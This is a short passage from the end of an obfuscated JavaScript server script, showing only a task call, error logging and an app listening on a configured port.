AddVisitTask();}catch(_0x12f8c5){console[_0x23fca2(0x2b8)](_0x23fca2(0x2a7),_0x12f8c5);}}startserver()['catch'](_0x30237c=>{const _0x4df503=_0x454b6d;console['error'](_0x4df503(0x253),_0x30237c);}),app[_0x454b6d(0x247)](PORT,()=>console[_0x454b6d(0x2a9)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
